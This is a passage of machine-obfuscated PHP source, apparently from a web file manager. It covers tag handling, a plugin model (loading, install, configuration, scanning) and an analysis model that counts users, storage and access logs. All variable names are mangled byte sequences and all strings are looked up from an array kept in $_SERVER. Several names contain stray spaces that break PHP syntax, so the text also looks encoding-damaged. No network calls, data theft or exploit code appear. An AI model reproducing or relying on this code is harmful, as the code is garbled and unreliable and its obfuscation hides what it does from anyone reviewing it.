$Úöâô¯[484]); $»ğ§ø“® = $this->listData($ é‡ç‹Ğ); $®çˆÓâª = array(); foreach ($¶²ö­²Æ as $­×äĞ›¦) { $üİ‚œß× = $‹¾‰ò¯‚[$­×äĞ›¦]; $¹ıÂ¶…â = _get($üİ‚œß×, $Úöâô¯[595]); if (!$üİ‚œß× || !$¹ıÂ¶…â || !$àÛ¾•Æ[$¹ıÂ¶…â]) { continue; } if (!$®çˆÓâª[$¹ıÂ¶…â]) { $®çˆÓâª[$¹ıÂ¶…â] = array(); } $®çˆÓâª[$¹ıÂ¶…â][] = $­×äĞ›¦; } $ûÜ¶è“ = array(); $Áè™àîë = array(); foreach ($»ğ§ø“® as $áØ›Å¯) { $ìÁö¨Œ = $áØ›Å¯[$Úöâô¯[87]]; $üİ‚œß× = $‹¾‰ò¯‚[$áØ›Å¯[$Úöâô¯[512]]]; $¹ıÂ¶…â = _get($üİ‚œß×, $Úöâô¯[595]); if (!$üİ‚œß× || !$¹ıÂ¶…â || !$®çˆÓâª[$¹ıÂ¶…â] || !$ìÁö¨Œ) { continue; } if (!in_array($áØ›Å¯[$Úöâô¯[512]], $®çˆÓâª[$¹ıÂ¶…â])) { continue; } if (!$ûÜ¶è“[$ìÁö¨Œ]) { $ûÜ¶è“[$ìÁö¨Œ] = array(); } $ûÜ¶è“[$ìÁö¨Œ][] = $¹ıÂ¶…â; } foreach ($ûÜ¶è“ as $ìÁö¨Œ => $ƒªÉÑ€­) { if (count($ƒªÉÑ€­) != count($®çˆÓâª)) { continue; } $Áè™àîë[] = $ìÁö¨Œ; } if (!$Áè™àîë) { return array(); } $«º•İà = array($Úöâô¯[503] => array($Úöâô¯[504], $Áè™àîë), $Úöâô¯[586] => $ é‡ç‹Ğ, $Úöâô¯[190] => SourceModel::TYPE_GROUP); $–¢ò‹ĞÅ = Model($Úöâô¯[1482])->listSource($«º•İà); if (!$–¢ò‹ĞÅ || count($Áè™àîë) == $–¢ò‹ĞÅ[$Úöâô¯[444]][$Úöâô¯[445]]) { return $–¢ò‹ĞÅ; } $¹ÈŒÏ§¼ = array(); $§Ì¡ùÏ = array_to_keyvalue($–¢ò‹ĞÅ[$Úöâô¯[85]], $Úöâô¯[12], $Úöâô¯[193]); $ø¡¹úÏ± = array_to_keyvalue($–¢ò‹ĞÅ[$Úöâô¯[86]], $Úöâô¯[12], $Úöâô¯[193]); $ùöøÅ = array_merge($ø¡¹úÏ±, $§Ì¡ùÏ); foreach ($Áè™àîë as $ìÁö¨Œ) { if (!in_array($ìÁö¨Œ, $ùöøÅ)) { $¹ÈŒÏ§¼[] = $ìÁö¨Œ; } } if ($¹ÈŒÏ§¼) { $this->removeBySource($ é‡ç‹Ğ, $¹ÈŒÏ§¼); } return $–¢ò‹ĞÅ; } protected function addToTag($İ©Ÿù†‡, $Íı¢ÁùÎ, $ÓÂöÂˆÅ) { $Ä‡²“ñ =& $_SERVER[±Ö‰ô½¯]; if (!$this->getByTagID($İ©Ÿù†‡, $ÓÂöÂˆÅ) || !$Íı¢ÁùÎ) { return !1; } if (!Model($Ä‡²“ñ[930])->pathInfo($Íı¢ÁùÎ)) { return !1; } $“¨ñÓ° = array($Ä‡²“ñ[1921] => 0, $Ä‡²“ñ[570] => $ÓÂöÂˆÅ, $Ä‡²“ñ[507] => $Íı¢ÁùÎ, $Ä‡²“ñ[508] => $Ä‡²“ñ[2255] . $İ©Ÿù†‡, $Ä‡²“ñ[506] => $Ä‡²“ñ[12], $Ä‡²“ñ[2140] => 0); if ($this->where($“¨ñÓ°)->find()) { return !1; } return $this->add($“¨ñÓ°); } protected function removeFromTag($Î™Ôèñá, $‹şğ¹»É, $çü¨êÚ) { $ÉÒ¢Šƒó =& $_SERVER[±Ö‰ô½¯]; if (!$this->getByTagID($Î™Ôèñá, $çü¨êÚ) || !$‹şğ¹»É) { return !1; } if (is_array($‹şğ¹»É)) { $‹şğ¹»É = array($ÉÒ¢Šƒó[7], $‹şğ¹»É); } $´—¨‡É = array($ÉÒ¢Šƒó[1921] => 0, $ÉÒ¢Šƒó[570] => $çü¨êÚ, $ÉÒ¢Šƒó[508] => $ÉÒ¢Šƒó[2255] . $Î™Ôèñá, $ÉÒ¢Šƒó[507] => $‹şğ¹»É); return $this->where($´—¨‡É)->delete(); } protected function removeByTag($Ãõ°Ü, $Àû×¥¶›) { $™²¢ë¯É =& $_SERVER[±Ö‰ô½¯]; if (!$this->getByTagID($Ãõ°Ü, $Àû×¥¶›)) { return !1; } $µƒêÍ·Ñ = array($™²¢ë¯É[1921] => 0, $™²¢ë¯É[570] => $Àû×¥¶›, $™²¢ë¯É[508] => $™²¢ë¯É[2255] . $Ãõ°Ü); return $this->where($µƒêÍ·Ñ)->delete(); } protected function removeBySource($âô¨ÎÇˆ, $‚ÍËè‰) { $¿‹£Î¿é =& $_SERVER[±Ö‰ô½¯]; if (!$âô¨ÎÇˆ || !$‚ÍËè‰) { return !1; } if (is_array($‚ÍËè‰)) { $‚ÍËè‰ = array($¿‹£Î¿é[7], $‚ÍËè‰); } $µ·ÕÀı’ = array($¿‹£Î¿é[1921] => 0, $¿‹£Î¿é[507] => $‚ÍËè‰, $¿‹£Î¿é[570] => array($¿‹£Î¿é[1130], 0), $¿‹£Î¿é[508] => $¿‹£Î¿é[2255] . $âô¨ÎÇˆ); return $this->where($µ·ÕÀı’)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\56\x70\x6c\x75\x67\151\x6e\x4c\151\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\163\x74\x61\x74\x75\x73", "\x72\x65\x67\x69\x65\163\x74", "\143\x6f\156\x66\x69\x67"); public function loadList($ºÌ±‰›° = false) { $ƒ³İÕ…å = array_to_keyvalue($this->listData(), $_SERVER[±Ö‰ô½¯][32]); if ($ºÌ±‰›°) { return $ƒ³İÕ…å[$ºÌ±‰›°]; } return $ƒ³İÕ…å; } public function init() { $¢’¢Íµ =& $_SERVER[±Ö‰ô½¯]; Hook::trigger($¢’¢Íµ[2256]); $²¬ÎÖÌİ = $this->loadPluginList(); foreach ($²¬ÎÖÌİ as $½óÉ¼ => $›Ûñ³ö®) { $ÓÂ‡ˆõŸ = $this->appAllow($½óÉ¼, $›Ûñ³ö®); if (!$ÓÂ‡ˆõŸ) { continue; } foreach ($›Ûñ³ö®[$¢’¢Íµ[2257]] as $¤ÚÛ–€³ => $´óÚÄÆ–) { Hook::bind($¤ÚÛ–€³, $´óÚÄÆ–); } } Hook::trigger($¢’¢Íµ[2258]); Hook::trigger(ACTION); } public function appAllow($ê™õœÒ, $ñó‰›, $¿ĞŞ–êÌ = true) { $äèıÇáµ =& $_SERVER[±Ö‰ô½¯]; $ùûæ¤ÕÅ = PLUGIN_DIR . $ê™õœÒ . $äèıÇáµ[2259]; if (!is_array($ñó‰›) || !is_array($ñó‰›[$äèıÇáµ[2257]]) || $ñó‰›[$äèıÇáµ[847]] != 1 || !is_file($ùûæ¤ÕÅ)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$äèıÇáµ[6]][$äèıÇáµ[2260]] || !$GLOBALS[$äèıÇáµ[6]][$äèıÇáµ[2261]]) { return !0; } $·ı÷ùş” = explode($äèıÇáµ[50], strtolower($GLOBALS[$äèıÇáµ[6]][$äèıÇáµ[2261]])); return in_array(strtolower($ê™õœÒ), $·ı÷ùş”) ? !1 : !0; } if ($¿ĞŞ–êÌ && !Action($äèıÇáµ[2262])->checkAuth($ê™õœÒ)) { return !1; } return !0; } public function unInstall($š¨•¼ú–) { $ëó‘Ë™Š =& $_SERVER[±Ö‰ô½¯]; $Éøô¾‡Ù = $this->loadList($š¨•¼ú–); if (file_exists(PLUGIN_DIR . $š¨•¼ú–)) { Hook::apply($š¨•¼ú– . $ëó‘Ë™Š[2263]); } $this->remove($Éøô¾‡Ù[$ëó‘Ë™Š[484]]); } public function changeStatus($İ”Ÿù…À, $ª”ßÛ¡¾) { $ıƒÍûÛù =& $_SERVER[±Ö‰ô½¯]; $”¯¸™¼ = $this->loadList($İ”Ÿù…À); if ($ª”ßÛ¡¾) { Hook::apply($İ”Ÿù…À . $ıƒÍûÛù[2264]); } $this->update($”¯¸™¼[$ıƒÍûÛù[484]], array($ıƒÍûÛù[2265] => $ª”ßÛ¡¾)); } public function appRegist($˜¬àö¯Ş, $ğÈÎ…ÀÅ) { $”Ç÷½Ä =& $_SERVER[±Ö‰ô½¯]; $©’âóë¥ = $this->loadList($˜¬àö¯Ş); if ($©’âóë¥) { $this->update($©’âóë¥[$”Ç÷½Ä[484]], array($”Ç÷½Ä[2257] => $ğÈÎ…ÀÅ)); } else { $ãŠ€ñğÂ = array($”Ç÷½Ä[32] => $˜¬àö¯Ş, $”Ç÷½Ä[2257] => $ğÈÎ…ÀÅ, $”Ç÷½Ä[847] => 0, $”Ç÷½Ä[6] => $this->getConfigDefault($˜¬àö¯Ş)); $this->insert($ãŠ€ñğÂ); } } public function getConfigDefault($¨µùÊ£ø) { $³¹™€ü· =& $_SERVER[±Ö‰ô½¯]; $ùõ‡¯ñ­ = array(); $ŸŸô×˜ = $this->getPackageJson($¨µùÊ£ø); if (!$ŸŸô×˜ && is_array($ŸŸô×˜[$³¹™€ü·[2266]])) { return $ùõ‡¯ñ­; } foreach ($ŸŸô×˜[$³¹™€ü·[2266]] as $¶ØÇÚ¨ğ => $ŞÍİòº) { if (!isset($ŞÍİòº[$³¹™€ü·[452]]) || isset($ùõ‡¯ñ­[$¶ØÇÚ¨ğ])) { continue; } $ùõ‡¯ñ­[$¶ØÇÚ¨ğ] = $ŞÍİòº[$³¹™€ü·[452]]; } return $ùõ‡¯ñ­; } public function getPackageJson($»„Ÿó) { return Hook::apply($»„Ÿó . $_SERVER[±Ö‰ô½¯][2267]); } public function getConfig($…ÒÜ¦‰Ş, $§üÙ”¬ = false) { $ùËà£õş =& $_SERVER[±Ö‰ô½¯]; $ï’ÁèŒ = array(); $ĞÀË‰ôñ = $this->loadList($…ÒÜ¦‰Ş); if ($ĞÀË‰ôñ && is_array($ĞÀË‰ôñ[$ùËà£õş[6]])) { $ï’ÁèŒ = $ĞÀË‰ôñ[$ùËà£õş[6]]; } if (!$ï’ÁèŒ || $§üÙ”¬) { $ï’ÁèŒ = $this->getConfigDefault($…ÒÜ¦‰Ş); } return $ï’ÁèŒ; } public function setConfig($¸î¶½¾é, $Ş™èÑ¿© = false) { $üªË¿§¯ =& $_SERVER[±Ö‰ô½¯]; $é‡–ìÒˆ = $this->loadList($¸î¶½¾é); if (!$é‡–ìÒˆ) { return !1; } $úæ–Ä›˜ = $é‡–ìÒˆ[$üªË¿§¯[6]]; if ($Ş™èÑ¿© == !1) { $úæ–Ä›˜ = array(); $Ş™èÑ¿© = $this->getConfigDefault($¸î¶½¾é); } foreach ($Ş™èÑ¿© as $ë÷¾£À => $º«Çªøš) { $úæ–Ä›˜[$ë÷¾£À] = is_string($º«Çªøš) ? trim($º«Çªøš) : $º«Çªøš; } $this->update($é‡–ìÒˆ[$üªË¿§¯[484]], array($üªË¿§¯[6] => $úæ–Ä›˜)); } public function viewList() { $‰Îó±«ä =& $_SERVER[±Ö‰ô½¯]; $åŠÊ¾şˆ = $this->loadList(); $this->pluginScan($åŠÊ¾şˆ); $åŠÊ¾şˆ = $this->loadPluginList(); $ÑÔ€éÅ = array(); foreach ($åŠÊ¾şˆ as $îû‹´Ôö => $„ññšÂ·) { $ªî×º·Õ = $„ññšÂ·; unset($„ññšÂ·[$‰Îó±«ä[2257]], $„ññšÂ·[$‰Îó±«ä[6]]); $ÔßÎµ÷Ë = PLUGIN_DIR . $„ññšÂ·[$‰Îó±«ä[32]] . $‰Îó±«ä[2259]; if (!is_file($ÔßÎµ÷Ë)) { continue; } $Í³¥ÒìÒ = Hook::apply($„ññšÂ·[$‰Îó±«ä[32]] . $‰Îó±«ä[2267]); if (!is_array($Í³¥ÒìÒ)) { continue; } $ÑÔ€éÅ[$îû‹´Ôö] = array_merge($„ññšÂ·, $Í³¥ÒìÒ); if ($ªî×º·Õ[$‰Îó±«ä[6]][$‰Îó±«ä[1840]] != $Í³¥ÒìÒ[$‰Îó±«ä[1814]]) { Hook::apply($„ññšÂ·[$‰Îó±«ä[32]] . $‰Îó±«ä[2264]); $ªî×º·Õ[$‰Îó±«ä[6]][$‰Îó±«ä[1840]] = $Í³¥ÒìÒ[$‰Îó±«ä[1814]]; $this->update($„ññšÂ·[$‰Îó±«ä[484]], array($‰Îó±«ä[6] => $ªî×º·Õ[$‰Îó±«ä[6]])); } } return $ÑÔ€éÅ; } private function loadPluginList() { $ÔÇ¬·¤ =& $_SERVER[±Ö‰ô½¯]; $‡„Öâ¯º = $this->loadList(); if (strtolower(MOD) == $ÔÇ¬·¤[2268]) { return $‡„Öâ¯º; } $åïÃ¢çÙ = Hook::trigger($ÔÇ¬·¤[2269], $‡„Öâ¯º); if ($‡„Öâ¯º && !$åïÃ¢çÙ) { die; } return $åïÃ¢çÙ ? $åïÃ¢çÙ : $‡„Öâ¯º; } private function pluginScan($œ±ÂƒÅÒ) { $Ø‰™ıë× =& $_SERVER[±Ö‰ô½¯]; recursion_dir(PLUGIN_DIR, $˜Ç»„°•, $ú‹ÉÛñé, 0); foreach ($˜Ç»„°• as $ü‘¨ù±î) { $ß£âŒ° = get_path_this($ü‘¨ù±î); if (isset($œ±ÂƒÅÒ[$ß£âŒ°]) || !file_exists($ü‘¨ù±î . $Ø‰™ıë×[2270]) || !file_exists($ü‘¨ù±î . $Ø‰™ıë×[2259])) { continue; } Hook::apply($ß£âŒ° . $Ø‰™ıë×[2264]); } } } goto AÁº¾Ã¿ÂÒ; EŒàŠÒ‚: class AnalysisModel extends ModelBaseLight { public function init($ªââ½Êì) { $¹¥»è’ =& $_SERVER[±Ö‰ô½¯]; $‹åİŠŞÈ = array($¹¥»è’[682] => array($¹¥»è’[33] => $¹¥»è’[2068], $¹¥»è’[353] => array($¹¥»è’[284], $¹¥»è’[863], $¹¥»è’[2069], $¹¥»è’[2070])), $¹¥»è’[2071] => array($¹¥»è’[33] => $¹¥»è’[2072], $¹¥»è’[353] => array($¹¥»è’[284], $¹¥»è’[861], $¹¥»è’[2073], $¹¥»è’[2074], $¹¥»è’[2075]))); if (!isset($‹åİŠŞÈ[$ªââ½Êì])) { return !1; } $this->optionType = $‹åİŠŞÈ[$ªââ½Êì][$¹¥»è’[33]]; $this->field = $‹åİŠŞÈ[$ªââ½Êì][$¹¥»è’[353]]; return !0; } public function listData($¥€—®è× = false, $úëøÃ¹¢ = "\155\157\x64\151\146\171\x54\x69\x6d\145", $ÊşïÜÇÔ = false) { return parent::listData($¥€—®è×, $úëøÃ¹¢, $ÊşïÜÇÔ); } public function trendList($·²æ›¨·) { $ù—Æ¿¾ò =& $_SERVER[±Ö‰ô½¯]; $Ì®õñ¼Œ = $this->listData(); if ($Ì®õñ¼Œ) { $Ü»òÕíÂ = end($Ì®õñ¼Œ); $Å‚™¬¹Ç = date($ù—Æ¿¾ò[2076], strtotime($ù—Æ¿¾ò[2077])); if ($Ü»òÕíÂ[$ù—Æ¿¾ò[284]] == $Å‚™¬¹Ç) { return $Ì®õñ¼Œ; } $ÓÇàô·ˆ = strtotime($Ü»òÕíÂ[$ù—Æ¿¾ò[284]]); } if (!isset($ÓÇàô·ˆ)) { $Ô†İ‘¸ì = $·²æ›¨· == $ù—Æ¿¾ò[682] ? $ù—Æ¿¾ò[614] : $ù—Æ¿¾ò[930]; $ÓÇàô·ˆ = Model($Ô†İ‘¸ì)->min($ù—Æ¿¾ò[233]); } $ôÈ–á”· = $ù—Æ¿¾ò[2078] . ucfirst($·²æ›¨·); $Ÿ•óöÜ± = $this->dateList($ÓÇàô·ˆ); foreach ($Ÿ•óöÜ± as $Å‚™¬¹Ç) { $this->{$ôÈ–á”·}($Å‚™¬¹Ç); } return $this->listData(); } private function dateList($ë—ëù) { $Ò÷ŞÌ³¨ =& $_SERVER[±Ö‰ô½¯]; $±·Ë”ÅÚ = $ë—ëù; $é¼ÊüŒî = strtotime($Ò÷ŞÌ³¨[2077]); $Ëç†éô„ = array(); while ($±·Ë”ÅÚ <= $é¼ÊüŒî) { $Ëç†éô„[] = date($Ò÷ŞÌ³¨[2076], $±·Ë”ÅÚ); $±·Ë”ÅÚ = strtotime($Ò÷ŞÌ³¨[2079], $±·Ë”ÅÚ); } return $Ëç†éô„; } public function _recordUser($Ö×³Ù‚ = '') { $š¶‚ÀĞØ =& $_SERVER[±Ö‰ô½¯]; $¥ã–ÉÍ = strtotime(date($š¶‚ÀĞØ[2080], strtotime($Ö×³Ù‚))); $³š’ˆÆ¶ = strtotime(date($š¶‚ÀĞØ[2081], strtotime($Ö×³Ù‚))); $¬ìñÇŸ€ = array($š¶‚ÀĞØ[233] => array($š¶‚ÀĞØ[1129], $³š’ˆÆ¶)); $³£º‘õ = Model($š¶‚ÀĞØ[614])->where($¬ìñÇŸ€)->count($š¶‚ÀĞØ[1542]); $¬ìñÇŸ€[$š¶‚ÀĞØ[233]] = array($š¶‚ÀĞØ[410], array($¥ã–ÉÍ, $³š’ˆÆ¶)); $Íƒ¹ë” = Model($š¶‚ÀĞØ[614])->where($¬ìñÇŸ€)->count($š¶‚ÀĞØ[1542]); $¬ìñÇŸ€[$š¶‚ÀĞØ[33]] = $š¶‚ÀĞØ[2082]; $àê¥‡Ó = Model($š¶‚ÀĞØ[2083])->where($¬ìñÇŸ€)->count($š¶‚ÀĞØ[2084]); $‡«ò„â = array($š¶‚ÀĞØ[284] => $Ö×³Ù‚, $š¶‚ÀĞØ[863] => (int) $³£º‘õ, $š¶‚ÀĞØ[2069] => (int) $Íƒ¹ë”, $š¶‚ÀĞØ[2070] => (int) $àê¥‡Ó); return $this->insert($‡«ò„â); } public function _recordStore($á¦©ñ’ = '') { $†ÉËú½‹ =& $_SERVER[±Ö‰ô½¯]; $ÈÓûÉœ = strtotime(date($†ÉËú½‹[2081], strtotime($á¦©ñ’))); $’îá§½Ş = array($†ÉËú½‹[233] => array($†ÉËú½‹[1129], $ÈÓûÉœ)); $ÕÊÆÏñ‚ = Model($†ÉËú½‹[557])->where($’îá§½Ş)->sum($†ÉËú½‹[79]); $’îá§½Ş[$†ÉËú½‹[497]] = 0; $¢§ñÈÖ¨ = Model($†ÉËú½‹[930])->where($’îá§½Ş)->sum($†ÉËú½‹[79]); $’îá§½Ş[$†ÉËú½‹[190]] = 1; $‰“ÔÆˆÊ = Model($†ÉËú½‹[930])->where($’îá§½Ş)->sum($†ÉËú½‹[79]); $’îá§½Ş[$†ÉËú½‹[190]] = 2; $ñ ¨† = Model($†ÉËú½‹[930])->where($’îá§½Ş)->sum($†ÉËú½‹[79]); $Şô»ŞË€ = array($†ÉËú½‹[284] => $á¦©ñ’, $†ÉËú½‹[861] => (int) $¢§ñÈÖ¨, $†ÉËú½‹[2073] => (int) $ÕÊÆÏñ‚, $†ÉËú½‹[2074] => (int) $‰“ÔÆˆÊ, $†ÉËú½‹[2075] => (int) $ñ ¨†); return $this->insert($Şô»ŞË€); } public function trend($¯àÑ®¦ã, $Ø—ó×¥) { $‚õ“§ø  =& $_SERVER[±Ö‰ô½¯]; if (!$this->init($¯àÑ®¦ã)) { return !1; } $¨±¾‹¾ú = $this->trendList($¯àÑ®¦ã); if ($¨±¾‹¾ú && $Ø—ó×¥ != $‚õ“§ø [1903]) { $˜Ééñ¶– = $¨±¾‹¾ú[0][$‚õ“§ø [284]]; $Úæ›õŸ’ = $this->validDate($Ø—ó×¥, $˜Ééñ¶–); $İŒÖªïı = array(); $“Ã¢¹œú = array_to_keyvalue($¨±¾‹¾ú, $‚õ“§ø [284]); foreach ($Úæ›õŸ’ as $óª”ˆù) { if (isset($“Ã¢¹œú[$óª”ˆù])) { $õŠ¡¬âô = $“Ã¢¹œú[$óª”ˆù]; } else { $õŠ¡¬âô = end($¨±¾‹¾ú); $õŠ¡¬âô[$‚õ“§ø [284]] = $óª”ˆù; if ($¯àÑ®¦ã == $‚õ“§ø [682]) { $õŠ¡¬âô[$‚õ“§ø [2069]] = $õŠ¡¬âô[$‚õ“§ø [2070]] = 0; } } $İŒÖªïı[] = $õŠ¡¬âô; } $¨±¾‹¾ú = $İŒÖªïı; } $’Ó•û£Â = array($‚õ“§ø [682] => array($‚õ“§ø [863] => LNG($‚õ“§ø [2085]), $‚õ“§ø [2069] => LNG($‚õ“§ø [2086]), $‚õ“§ø [2070] => LNG($‚õ“§ø [2087])), $‚õ“§ø [2071] => array($‚õ“§ø [861] => LNG($‚õ“§ø [2088]), $‚õ“§ø [2073] => LNG($‚õ“§ø [2089]), $‚õ“§ø [2074] => LNG($‚õ“§ø [2090]), $‚õ“§ø [2075] => LNG($‚õ“§ø [2091]))); $œÒ÷¬Ä = array($‚õ“§ø [682] => $‚õ“§ø [2092], $‚õ“§ø [2071] => $‚õ“§ø [79]); if (empty($¨±¾‹¾ú)) { $óª”ˆù = date($‚õ“§ø [2076], strtotime($‚õ“§ø [2077])); $»à¢ßÚ™ = array($‚õ“§ø [284] => $óª”ˆù); foreach ($’Ó•û£Â[$¯àÑ®¦ã] as $—¢”“Û¨ => $Ù«–´ôÑ) { $»à¢ßÚ™[$—¢”“Û¨] = 0; } $¨±¾‹¾ú[] = $»à¢ßÚ™; } $Ôù›ÜşŸ = array(); foreach ($¨±¾‹¾ú as $Ù«–´ôÑ) { if ($¯àÑ®¦ã == $‚õ“§ø [2071] && $Ù«–´ôÑ[$‚õ“§ø [2073]] > $Ù«–´ôÑ[$‚õ“§ø [861]]) { $Ù«–´ôÑ[$‚õ“§ø [2073]] = $Ù«–´ôÑ[$‚õ“§ø [861]]; } foreach ($’Ó•û£Â[$¯àÑ®¦ã] as $—¢”“Û¨ => $ù°¶öèƒ) { $õŠ¡¬âô = array($‚õ“§ø [284] => $Ù«–´ôÑ[$‚õ“§ø [284]], $‚õ“§ø [1815] => $ù°¶öèƒ); $õŠ¡¬âô[$œÒ÷¬Ä[$¯àÑ®¦ã]] = isset($Ù«–´ôÑ[$—¢”“Û¨]) ? $Ù«–´ôÑ[$—¢”“Û¨] : 0; $Ôù›ÜşŸ[] = $õŠ¡¬âô; } } return $Ôù›ÜşŸ; } public function validDate($şÄ–ÚÜ, $ÀÛÚ²ˆÆ) { $Í¨Ø±€À =& $_SERVER[±Ö‰ô½¯]; $’Â—šÁ = date($Í¨Ø±€À[2076], strtotime($Í¨Ø±€À[2077])); $ÜÜáÒ¼õ = array($’Â—šÁ); switch ($şÄ–ÚÜ) { case $Í¨Ø±€À[1910]: $¼Æ€õŞÓ = mktime(0, 0, 0, date($Í¨Ø±€À[2093]), date($Í¨Ø±€À[1608]) - date($Í¨Ø±€À[1694]) + 7 - 7, date($Í¨Ø±€À[2094])); $öòä½¤ß = 0; do { $±•²ñ¹– = date($Í¨Ø±€À[2076], $¼Æ€õŞÓ - 3600 * 24 * 7 * $öòä½¤ß); $ÜÜáÒ¼õ[] = $±•²ñ¹–; $öòä½¤ß++; } while ($ÀÛÚ²ˆÆ < $±•²ñ¹–); break; case $Í¨Ø±€À[1908]: $öòä½¤ß = 1; do { $şÌøî˜ = date($Í¨Ø±€À[2095], strtotime("\x2d\40{$öòä½¤ß}\40\x6d\157\x6e\164\x68\x73")); $ÜÜáÒ¼õ[] = $şÌøî˜; $öòä½¤ß++; } while ($ÀÛÚ²ˆÆ < $şÌøî˜); break; case $Í¨Ø±€À[2096]: $Úç€É´– = (int) date($Í¨Ø±€À[2094], strtotime($ÀÛÚ²ˆÆ)); $ÕŠ„§¸Ë = (int) date($Í¨Ø±€À[2094]); if ($Úç€É´– >= $ÕŠ„§¸Ë) { break; } for ($Úç€É´–; $Úç€É´– < $ÕŠ„§¸Ë; $Úç€É´–++) { $ÜÜáÒ¼õ[] = $Úç€É´– . $Í¨Ø±€À[2097]; } break; default: break; } if ($ÀÛÚ²ˆÆ > end($ÜÜáÒ¼õ)) { array_pop($ÜÜáÒ¼õ); } sort($ÜÜáÒ¼õ); return $ÜÜáÒ¼õ; } public function listTable($ºşŠÓˆ) { $ƒÊÕºì× = ucfirst($ºşŠÓˆ); return Model($ƒÊÕºì×)->listData(); } public function option($ªœûÑî) { return call_user_func_array(array($this, $_SERVER[±Ö‰ô½¯][2098] . ucfirst($ªœûÑî)), array()); } private function optionUser() { $Ç§±Š” =& $_SERVER[±Ö‰ô½¯]; $ÈîôŞĞ£ = Model($Ç§±Š”[614])->count($Ç§±Š”[1542]); $§®©øÀ² = Model($Ç§±Š”[614])->where($Ç§±Š”[2099])->count($Ç§±Š”[1542]); $©£Ñ²úå = intval($GLOBALS[$Ç§±Š”[6]][$Ç§±Š”[426]][$Ç§±Š”[1876]]) / 3600; $‚ÎõÙ ‰ = strtotime("\x2d{$©£Ñ²úå}\x20\150\x6f\165\x72\x73"); $âô¢›öæ = strtotime(date($Ç§±Š”[2080])); if ($‚ÎõÙ ‰ < $âô¢›öæ) { $‚ÎõÙ ‰ = $âô¢›öæ; } $©ÑµªäÆ = array($Ç§±Š”[2100] => array($Ç§±Š”[1130], $‚ÎõÙ ‰)); $ÄÁÃ×Î« = (int) Model($Ç§±Š”[614])->where($©ÑµªäÆ)->count($Ç§±Š”[1542]); if (!$ÄÁÃ×Î«) { $ÄÁÃ×Î« = 1; } $©ÑµªäÆ = array($Ç§±Š”[2100] => array($Ç§±Š”[1130], $âô¢›öæ)); $”˜´“Ï = Model($Ç§±Š”[614])->where($©ÑµªäÆ)->count($Ç§±Š”[1542]); return array($Ç§±Š”[856] => (int) $ÈîôŞĞ£, $Ç§±Š”[2101] => (int) ($ÈîôŞĞ£ - $§®©øÀ²), $Ç§±Š”[2102] => (int) $§®©øÀ², $Ç§±Š”[2103] => (int) $”˜´“Ï, $Ç§±Š”[2104] => $ÄÁÃ×Î«); } private function optionFile() { $¯ƒ²¦’ù =& $_SERVER[±Ö‰ô½¯]; $¨¦Ş¼õÄ = $this->sourceSize(); $ø«†©¶  = $¨¦Ş¼õÄ[$¯ƒ²¦’ù[79]]; $¹„ ‘ = $¨¦Ş¼õÄ[$¯ƒ²¦’ù[2073]]; $â·ØÕÆŠ = Model($¯ƒ²¦’ù[930])->where(array($¯ƒ²¦’ù[497] => 0))->count($¯ƒ²¦’ù[193]); $„…ö»ƒ = array($¯ƒ²¦’ù[497] => 0, $¯ƒ²¦’ù[233] => array($¯ƒ²¦’ù[1130], strtotime(date($¯ƒ²¦’ù[2080])))); $£ÄÔºŸ = Model($¯ƒ²¦’ù[930])->where($„…ö»ƒ)->sum($¯ƒ²¦’ù[79]); $èØìôÔã = Model($¯ƒ²¦’ù[930])->where($„…ö»ƒ)->count($¯ƒ²¦’ù[193]); return array($¯ƒ²¦’ù[861] => $ø«†©¶ , $¯ƒ²¦’ù[2073] => $¹„ ‘, $¯ƒ²¦’ù[2105] => $ø«†©¶  - $¹„ ‘, $¯ƒ²¦’ù[2106] => (int) $£ÄÔºŸ, $¯ƒ²¦’ù[863] => (int) $â·ØÕÆŠ, $¯ƒ²¦’ù[2107] => (int) $èØìôÔã); } private function optionAccess() { $æĞÜŒŠÇ =& $_SERVER[±Ö‰ô½¯]; return array($æĞÜŒŠÇ[856] => $this->typeLogCnt(), $æĞÜŒŠÇ[108] => $this->typeLogCnt($æĞÜŒŠÇ[108]), $æĞÜŒŠÇ[536] => $this->typeLogCnt($æĞÜŒŠÇ[536]), $æĞÜŒŠÇ[1280] => $this->typeLogCnt($æĞÜŒŠÇ[1280]), $æĞÜŒŠÇ[1511] => $this->typeLogCnt($æĞÜŒŠÇ[1511]), $æĞÜŒŠÇ[682] => $this->typeLogCnt($æĞÜŒŠÇ[12], $æĞÜŒŠÇ[2084])); } private function typeLogCnt($Şìí“Œß = '', $ß¸í½êÔ = "\151\144") { $ä¿¥ôŒÇ =& $_SERVER[±Ö‰ô½¯]; $…ç¿ØÍ = array($ä¿¥ôŒÇ[108] => array($ä¿¥ôŒÇ[2108], $ä¿¥ôŒÇ[2109]), $ä¿¥ôŒÇ[536] => array($ä¿¥ôŒÇ[2110], $ä¿¥ôŒÇ[2111]), $ä¿¥ôŒÇ[1280] => array($ä¿¥ôŒÇ[2112], $ä¿¥ôŒÇ[2113], $ä¿¥ôŒÇ[2114]), $ä¿¥ôŒÇ[1511] => array($ä¿¥ôŒÇ[2115], $ä¿¥ôŒÇ[2116]), $ä¿¥ôŒÇ[1512] => array($ä¿¥ôŒÇ[2117], $ä¿¥ôŒÇ[2118], $ä¿¥ôŒÇ[2119])); $Êöˆâ°¿ = strtotime(date($ä¿¥ôŒÇ[2080])); $¢”¸–ÛÔ = array($ä¿¥ôŒÇ[233] => array($ä¿¥ôŒÇ[1130], $Êöˆâ°¿)); if ($Şìí“Œß) { $¢”¸–ÛÔ[$ä¿¥ôŒÇ[33]] = array($ä¿¥ôŒÇ[7], $…ç¿ØÍ[$Şìí“Œß]); } $ÇŒõÉ¤İ = Model($ä¿¥ôŒÇ[2083])->where($¢”¸–ÛÔ)->count($ß¸í½êÔ); return (int) $ÇŒõÉ¤İ; } private function optionServer() { $ú‡úçâ =& $_SERVER[±Ö‰ô½¯]; $Ş—ŠØ¶¹ = $this->diskDriver(); $öÆÃØŠÑ = KodIO::defaultDriver(); $ÇÁíÏ™ = array($ú‡úçâ[923] => $öÆÃØŠÑ[$ú‡úçâ[484]]); $ÒÕïØòÙ = Model($ú‡úçâ[557])->where($ÇÁíÏ™)->sum($ú‡úçâ[79]); $ÛÏ¡– = explode($ú‡úçâ[53], $_SERVER[$ú‡úçâ[146]]); $ºÕã¹Å = $ÛÏ¡–[0]; $ûû‹»ÏÖ = $GLOBALS[$ú‡úçâ[6]][$ú‡úçâ[21]]; $™‘˜ßÌà = 